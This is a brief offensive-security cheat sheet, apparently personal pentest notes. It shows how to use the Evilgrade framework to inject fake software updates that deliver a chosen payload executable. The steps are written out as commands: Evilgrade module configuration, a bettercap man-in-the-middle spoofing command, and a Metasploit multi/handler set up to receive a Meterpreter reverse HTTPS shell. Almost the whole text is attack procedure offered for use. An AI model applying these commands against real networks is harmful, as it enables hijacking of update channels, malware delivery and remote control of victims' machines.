# Evilgrade

Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates.

```
evilgrade > show modules (see programs that we can hijack their updates)
configure dap
show options
set agent <payload.exe>
set endsite www.speedbit.com
start
```

## MITM

For this to wok, you need to be MITM.

```
bettercap -iface eth0 -caplet /root/spoof.cap
```

## Listening for connections

```
msfconsole
use exploit/multi/handler
show options
set PAYLOAD windows/meterpreter/reverse_https
```
